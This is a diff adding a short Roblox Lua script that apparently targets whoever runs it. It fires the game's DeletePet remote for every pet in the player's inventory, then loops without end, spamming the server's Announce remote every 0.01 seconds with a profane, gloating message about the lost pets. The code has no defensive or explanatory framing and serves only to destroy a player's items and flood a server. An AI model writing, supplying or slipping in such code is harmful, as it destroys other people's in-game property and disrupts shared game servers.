@@ -1,0 +1,23 @@
+local inven = game.Players.LocalPlayer.PlayerGui.PetsGui.Frame.MainFrame.MainFrame.Inventory
+
+for i, v in pairs(inven:GetChildren()) do
+    if v:IsA("Frame") and v.Name ~= "Template" then
+        local args = {
+           [1] = v.Name
+        }
+        game:GetService("ReplicatedStorage").Remotes.Pets.DeletePet:FireServer(unpack(args))
+
+    end
+end
+
+local done = 0
+
+repeat
+    local args2 = {
+    [1] = "You have been fucked. Your pets are gone! Haha.",
+    [2] = "Error"
+}
+
+game:GetService("ReplicatedStorage").Remotes.Announce.Announce:FireServer(unpack(args2))
+wait(0.01)
+until done == 10
